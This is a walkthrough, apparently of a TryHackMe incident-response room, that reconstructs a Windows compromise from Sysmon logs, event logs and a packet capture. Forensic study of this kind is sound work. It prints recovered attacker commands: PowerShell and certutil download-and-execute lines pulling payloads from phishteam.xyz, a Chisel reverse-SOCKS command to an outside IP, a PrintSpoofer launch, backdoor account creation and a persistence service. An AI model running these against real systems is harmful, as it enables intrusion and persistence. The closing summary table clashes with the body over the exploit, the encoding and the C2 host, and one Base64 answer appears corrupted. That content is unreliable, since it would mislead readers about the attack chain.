---
title: Tempest Walkthrough
description: Conduct a full log and endpoint investigation on a compromised Windows workstation.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this walkthrough, we act as incident responders handling a full compromise of a Windows workstation (`TEMPEST`). Using `SysmonView`, `EvtxECmd`, `Timeline Explorer`, `Wireshark`, and `CyberChef`, we reconstruct every stage of the intrusion: from a weaponized Word document exploiting Follina (`CVE-2022-30190`) and Startup folder persistence, to a Nim-compiled HTTP C2 beacon, internal reconnaissance, Chisel SOCKS5 tunneling over WinRM, `PrintSpoofer` privilege escalation (`SeImpersonatePrivilege`), and `SYSTEM`-level service persistence.

---

**Learning Objectives**

- Investigate a multi-stage intrusion using Windows Event Logs and Sysmon telemetry
- Analyze malicious documents, PowerShell execution, and network traffic
- Extract indicators of compromise (IoCs) and map the full attack chain

---
## Task 1.1
**What is the SHA256 hash of the `capture.pcapng` file?**

**Answer**: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`

**Why?**
Before touching the evidence, we verify the integrity of the artifacts in `C:\Users\user\Desktop\Incident Files` using `Get-FileHash -Algorithm SHA256 .\capture.pcapng`.

![](../../assets/Pasted%20image%2020261114203034.png)

## Task 1.2
**What is the SHA256 hash of the `sysmon.evtx` file?**

**Answer**: `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`

**Why?**
Running `Get-FileHash -Algorithm SHA256 .\sysmon.evtx` outputs `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`.

![](../../assets/Pasted%20image%2020261114203053.png)

## Task 1.3
**What is the SHA256 hash of the `windows.evtx` file?**

**Answer**: `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

**Why?**
Running `Get-FileHash -Algorithm SHA256 .\windows.evtx` returns `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`.

![](../../assets/Pasted%20image%2020261114203105.png)

## Task 2.1
**The user of this machine was compromised by a malicious document. What is the file name of the document?**

**Answer**: `free_magicules.doc`

**Why?**
Loading the exported Sysmon XML logs into `SysmonView` and inspecting `chrome.exe` shows a `File Created` and `File Stream Created` event in the user's Downloads folder for `C:\Users\benimaru\Downloads\free_magicules.doc`.

![](../../assets/Pasted%20image%2020261115140044.png)

## Task 2.2
**What is the name of the compromised user and machine? (Format: `username-machine name`)**

**Answer**: `benimaru-TEMPEST`

**Why?**
From the same `chrome.exe` hierarchy in `SysmonView`, the host node is `TEMPEST` and the file path belongs to `C:\Users\benimaru\Downloads\free_magicules.doc`, giving `benimaru-TEMPEST`.

![](../../assets/Pasted%20image%2020261115140306.png)

## Task 2.3
**What is the PID of the Microsoft Word process that opened the malicious document?**

**Answer**: `496`

**Why?**
Filtering `SysmonView` for `WINWORD.EXE` and opening the `ProcessCreate` event details at `6/20/2022 5:13:12 PM` shows `Process ID: 496`.

![](../../assets/Pasted%20image%2020261115140509.png)

## Task 2.4
**Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the document's traffic?**

**Answer**: `167.71.199.191`

**Why?**
In the `WINWORD.EXE` event flow, a DNS query for `phishteam.xyz` is immediately followed by an outbound HTTP connection (`Destination port: 80`) to `Destination IP: 167.71.199.191`.

![](../../assets/Pasted%20image%2020261115140934.png)

## Task 2.5
**What is the base64 encoded string in the malicious payload executed by the document?**

**Answer**: `JGFwcD1bRW52aXJvbmlbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==`

**Why?**
Opening `sysmon.csv` in `Timeline Explorer` and filtering `Payload Data5` (which holds the `ParentProcessId`) by `496` isolates the child processes spawned by `WINWORD.EXE`.

![](../../assets/Pasted%20image%2020261115142550.png)

Inspecting the `Executable Info` cell reveals `msdt.exe` executing an `Invoke-Expression` command that decodes the Base64 string above via `FromBase64String`.

![](../../assets/Pasted%20image%2020261115142434.png)

## Task 2.6
**What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**

**Answer**: `2022-30190`

**Why?**
The command line shows `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? ..."` spawned from Microsoft Word, which is the signature of **CVE-2022-30190** (Follina), the Microsoft Support Diagnostic Tool (MSDT) remote code execution vulnerability.

![](../../assets/Pasted%20image%2020261115143245.png)

![](../../assets/Pasted%20image%2020261115143342.png)

## Task 3.1
**The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**

**Answer**: `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

**Why?**
Decoding the Base64 string from `msdt.exe` in CyberChef reveals the following PowerShell one-liner:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

![](../../assets/Pasted%20image%2020261115143637.png)

Checking the corresponding `FileCreated` event in `SysmonView` confirms `sdiagnhost.exe` wrote `update.zip` inside `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.

![](../../assets/Pasted%20image%2020261115143626.png)

## Task 3.2
**The implanted file executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**

**Answer**: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`

**Why?**
First, we check `windows.csv` for successful logons (`Event Id = 4624`) targeting `TEMPEST\benimaru` around the time of the compromise (`2022-06-20 17:12` / `17:15`).

![](../../assets/Pasted%20image%2020261115145429.png)
![](../../assets/Pasted%20image%2020261115145438.png)

![](../../assets/Pasted%20image%2020261115145659.png)

Next, we switch to `sysmon.csv`, filter `User Name` by `benimaru`, and search for `powershell` commands executed right after logon.

![](../../assets/Pasted%20image%2020261115145718.png)

![](../../assets/Pasted%20image%2020261115145650.png)

Inspecting the `powershell.exe` process entries shows the Startup script running hidden PowerShell to download and execute `first.exe` via `certutil`:

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

![](../../assets/Pasted%20image%2020261115150007.png)

## Task 3.3
**Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**

**Answer**: `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`

**Why?**
Selecting `first.exe` (`C:\Users\Public\Downloads\first.exe`) in `SysmonView` and opening its `ProcessCreate` details at `6/20/2022 5:15:14 PM` reveals the SHA256 hash `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`.

![](../../assets/Pasted%20image%2020261115150217.png)

![](../../assets/Pasted%20image%2020261115150150.png)

## Task 3.4
**What is the domain and port used by the attacker for stage 2 execution?**

**Answer**: `resolvecyber.xyz:80`

**Why?**
Opening the `DNSQuery` and `NetworkConnectionDetected` events for `first.exe` in `SysmonView` shows the binary resolving `resolvecyber.xyz` (`167.71.222.162`) and connecting over TCP port `80` (`resolvecyber.xyz:80`).

![](../../assets/Pasted%20image%2020261115150613.png)

## Task 4.1
**What is the URL of the malicious payload embedded in the document?**

**Answer**: `http://phishteam.xyz/02dcf07/index.html`

**Why?**
Opening `capture.pcapng` in Wireshark and filtering for `http contains "phishteam.xyz"` shows that right after downloading `/02dcf07/free_magicules.doc`, Microsoft Office (`ms-office; MSOffice 16`) requests `http://phishteam.xyz/02dcf07/index.html` to trigger the Follina exploit.

![](../../assets/Pasted%20image%2020261115152121.png)
![](../../assets/Pasted%20image%2020261115152151.png)

## Task 4.2
**What is the encoding used by the attacker on the C2 connection?**

**Answer**: `base64`

**Why?**
Filtering Wireshark for `http contains "resolve"` reveals repeated HTTP requests to `resolvecyber.xyz` carrying Base64-encoded strings inside the query string (such as `d2hvYW1pIC0gdGVtcGVzdFxiZW5pbWFydQ0K`).

![](../../assets/Pasted%20image%2020261115152322.png)

## Task 4.3
**The malicious C2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**

**Answer**: `q`

**Why?**
Inspecting the request URI `/9ab62b5?q=d2hvYW1pIC0gdGVtcGVzdFxiZW5pbWFydQ0K` and decoding the value in CyberChef (`whoami - tempest\benimaru`) confirms that command output is exfiltrated inside the `q` URL parameter.

![](../../assets/Pasted%20image%2020261115152735.png)

## Task 4.4
**The malicious C2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**

**Answer**: `/9ab62b5`

**Why?**
Every HTTP request sent by the C2 agent to `resolvecyber.xyz` polls the endpoint `/9ab62b5`.

![](../../assets/Pasted%20image%2020261115153059.png)
![](../../assets/Pasted%20image%2020261115153134.png)

## Task 4.5
**What is the HTTP method used by the binary?**

**Answer**: `GET`

**Why?**
As seen in the Wireshark packet list and HTTP header details (`Request Method: GET`), the beacon communicates exclusively via `GET` requests.

![](../../assets/Pasted%20image%2020261115153206.png)

## Task 4.6
**Based on the user agent, what programming language was used by the attacker to compile the binary?**

**Answer**: `Nim`

**Why?**
Checking the HTTP request headers in Wireshark shows `user-agent: Nim httpclient/1.6.6`, indicating the C2 implant was written and compiled in `Nim`.

![](../../assets/Pasted%20image%2020261115153232.png)

## Task 5.1
**The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**

**Answer**: `infernotempest`

**Why?**
Browsing through the C2 `GET /9ab62b5?q=...` requests in Wireshark, we locate packet `5893` and decode its Base64 payload in CyberChef.

![](../../assets/Pasted%20image%2020261115154844.png)

The decoded output shows the attacker reading `C:\Users\Benimaru\Desktop\automation.ps1`, which contains hardcoded credentials for `TEMPEST\benimaru` with `$pass = "infernotempest"`.

![](../../assets/Pasted%20image%2020261115154836.png)

## Task 5.2
**The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**

**Answer**: `5985`

**Why?**
Continuing through the C2 traffic in Wireshark, we find packet `5919` (`Length: 3060`), which contains a long Base64 string in the `q` parameter. Since Wireshark truncates long URI strings in the packet details pane, we export the raw packet text to `base64.txt` and decode the full Base64 payload:

![](../../assets/Pasted%20image%2020261115160447.png)

![](../../assets/Pasted%20image%2020261115160437.png)

Decoding the payload gives the output of `netstat -ano -p tcp`:

```text
netstat -ano -p tcp

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  ...
```

Port `5985` is the default HTTP port for Windows Remote Management (`WinRM`), which allows remote PowerShell sessions.

## Task 5.3
**The attacker then established a reverse socks proxy to access the internal services hosted on the machine. What is the command-line executed by the attacker to establish a reverse socks proxy?**

**Answer**: `"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks`

**Why?**
Searching for child processes of `first.exe` in `Timeline Explorer` shows the C2 agent launching `ch.exe` with the command line `"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks`.

![](../../assets/Pasted%20image%2020261115161250.png)

## Task 5.4
**What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy?**

**Answer**: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`

**Why?**
Inspecting `ch.exe` in `SysmonView` (`Process ID: 7388`) shows `SHA256: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`.

![](../../assets/Pasted%20image%2020261115161402.png)

## Task 5.5
**What is the name of the tool used by the attacker based on the SHA256 hash?**

**Answer**: `chisel`

**Why?**
Looking up the SHA256 hash on VirusTotal flags the binary as `hacktool.chisel/hack` (`Chisel`), a fast TCP/UDP tunnel over HTTP commonly used to create reverse SOCKS proxies.

![](../../assets/Pasted%20image%2020261115161435.png)

## Task 5.6
**The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?**

**Answer**: `WinRM`

**Why?**
In `Timeline Explorer`, right after `ch.exe` establishes the reverse SOCKS tunnel, subsequent attacker commands (`whoami /priv`, `powershell.exe`, `spf.exe`) are spawned under the parent process `C:\Windows\system32\wsmprovhost.exe -Embedding`. `wsmprovhost.exe` is the host process for **WinRM** (Windows Remote Management).

![](../../assets/Pasted%20image%2020261115163943.png)
![](../../assets/Pasted%20image%2020261115163956.png)

## Task 6.1
**After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary? (Format: `binary name,SHA256 hash`)**

**Answer**: `spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

**Why?**
In `Timeline Explorer`, after running `whoami /priv`, the attacker runs `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/spf.exe -outfile spf.exe`.

![](../../assets/Pasted%20image%2020261115164426.png)

Searching `sysmon.csv` for `spf.exe` reveals its `Hashes` field containing `SHA256=8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`.

![](../../assets/Pasted%20image%2020261115164515.png)

## Task 6.2
**Based on the SHA256 hash of the binary, what is the name of the tool used?**

**Answer**: `PrintSpoofer`

**Why?**
Searching the SHA256 hash of `spf.exe` on VirusTotal identifies the file as `PrintSpoofer64.exe` (`hacktool.printspoofer/tedy`).

![](../../assets/Pasted%20image%2020261115164547.png)

## Task 6.3
**The tool exploits a specific privilege owned by the user. What is the name of the privilege?**

**Answer**: `SeImpersonatePrivilege`

**Why?**
`PrintSpoofer` abuses the `Impersonate a client after authentication` user right (`SeImpersonatePrivilege`) by coercing the Print Spooler service to connect to a named pipe and impersonating its `SYSTEM` token.

![](../../assets/Pasted%20image%2020261115164836.png)

## Task 6.4
**Then, the attacker executed the tool with another binary to establish a C2 connection. What is the name of the binary?**

**Answer**: `final.exe`

**Why?**
In `Timeline Explorer`, the attacker downloads `http://phishteam.xyz/02dcf07/final.exe` to `C:\ProgramData\final.exe` and executes it as `SYSTEM` using `"C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe`.

![](../../assets/Pasted%20image%2020261115165027.png)

## Task 6.5
**The binary connects to a different port from the first C2 binary. What is the domain and port used?**

**Answer**: `resolvecyber.xyz:8080`

**Why?**
Inspecting `final.exe` (`C:\ProgramData\final.exe`) in `SysmonView` shows DNS queries for `resolvecyber.xyz` followed by outbound TCP connections to `167.71.222.162:8080` (`resolvecyber.xyz:8080`).

![](../../assets/Pasted%20image%2020261115165059.png)

## Task 7.1
**Upon achieving SYSTEM access, the attacker then created two users. What are the account names? (Format: alphabetical order, comma-delimited)**

**Answer**: `shion,shuna`

**Why?**
We can find these accounts either by decoding the Base64 C2 responses over port `8080` in Wireshark/CyberChef (`net user shion m4st3rch3f!` and `net user shuna princess`) or by filtering `sysmon.csv` in `Timeline Explorer` for `User Name Contains SYSTEM` and `final.exe`.

![](../../assets/Pasted%20image%2020261115165552.png)

![](../../assets/Pasted%20image%2020261115165512.png)
![](../../assets/Pasted%20image%2020261115165538.png)

## Task 7.2
**Prior to the successful creation of the accounts, the attacker executed commands that failed to create the account. What is the missing option that made the attempt fail?**

**Answer**: `/add`

**Why?**
As seen in the decoded C2 traffic (`net user shion m4st3rch3f!` and `net user shuna princess`) and in `Timeline Explorer` (`"C:\Windows\system32\net.exe" user shuna`), the attacker initially forgot the `/add` switch before re-running `net.exe user /add shion m4st3rch3f!` and `net.exe user /add shuna princess`.

![](../../assets/Pasted%20image%2020261115165831.png)

![](../../assets/Pasted%20image%2020261115165817.png)

## Task 7.3
**Based on windows event logs, what is the Event ID that indicates a user account was created?**

**Answer**: `4720`

**Why?**
In Windows Security Event Logs, **Event ID 4720** (`A user account was created`) is logged whenever a new user account is created.

![](../../assets/Pasted%20image%2020261115170015.png)

## Task 7.4
**The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?**

**Answer**: `"C:\Windows\system32\net.exe" localgroup administrators /add shion`

**Why?**
In `Timeline Explorer` (filtering for `User Name Contains SYSTEM` and `final.exe`), we see the command line `"C:\Windows\system32\net.exe" localgroup administrators /add shion` adding `shion` to the local `Administrators` group.

![](../../assets/Pasted%20image%2020261115170214.png)

## Task 7.5
**Based on windows event logs, what is the Event ID that indicates the addition to a sensitive local group?**

**Answer**: `4732`

**Why?**
**Event ID 4732** (`A member was added to a security-enabled local group`) records additions to local security groups such as `Administrators`.

![](../../assets/Pasted%20image%2020261115170301.png)

## Task 7.6
**After the account creation, the attacker executed a technique to establish persistent administrative access. What is the full command executed by the attacker to achieve this?**

**Answer**: `"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto`

**Why?**
Checking the remaining `SYSTEM` commands spawned by `final.exe` in `Timeline Explorer` shows the attacker using `sc.exe` to register `C:\ProgramData\final.exe` as an auto-start Windows service named `TempestUpdate`:

```text
"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto
```

![](../../assets/Pasted%20image%2020261115170355.png)

---

## Personal Note: Tempest Attack Chain & Tooling Summary

Quick overview of the end-to-end kill chain in Tempest and the tools we used at each stage:

| Stage | Technique / Artifact | Investigation Tool & Method |
| :--- | :--- | :--- |
| **1. Initial Access** | Malicious Word doc (`free_magicules.doc`) with `AutoOpen` VBA macro | - `oledump.py -s 8 --vbadecompresscorrupt free_magicules.doc`<br>- `vipermonkey free_magicules.doc` |
| **2. Execution & Staging** | Base64 + XOR (`0x35`) obfuscated PowerShell running `Invoke-WebRequest` to drop `first.exe` & `ch.exe` | - **CyberChef**: `From Base64` -> `XOR (Key: 35, Hex)` -> `Decode text (UTF-16LE)`<br>- **Timeline Explorer**: Filter `ParentImage = WINWORD.EXE` (`Event ID 1`) |
| **3. Command & Control (C2)** | Nim-compiled HTTP beacon (`first.exe`, `Nim httpclient/1.6.6`) polling `/9ab62b5` with Base64 `q=` parameters | - **Brim**: `_path=="dns" \| count() by query` & `_path=="http"`<br>- **Wireshark**: Filter `http.host == "phishteam.xyz"` and export raw packet text for truncated URIs (`>3000` bytes) |
| **4. Discovery & Lateral Access** | Reading `automation.ps1` (`$pass = "infernotempest"`), checking `netstat -ano -p tcp` (`5985` WinRM), and starting a reverse SOCKS proxy via **Chisel** (`ch.exe client ... R:socks`) | - **SysmonView / Timeline Explorer**: Trace child processes of `first.exe` and `wsmprovhost.exe -Embedding` (WinRM host process) |
| **5. Privilege Escalation** | Abusing `SeImpersonatePrivilege` with **PrintSpoofer** (`spf.exe -c C:\ProgramData\final.exe`) to spawn a `SYSTEM` C2 agent (`resolvecyber.xyz:8080`) | - **Timeline Explorer**: Filter `wsmprovhost.exe` children -> hash lookup on VirusTotal |
| **6. Persistence** | Creating local users (`shion`, `shuna` - `Event ID 4720`), adding `shion` to `administrators` (`Event ID 4732`), and registering auto-start service `TempestUpdate` (`sc.exe`) | - **Timeline Explorer**: Filter `User Name = SYSTEM` and `ParentImage = final.exe` |
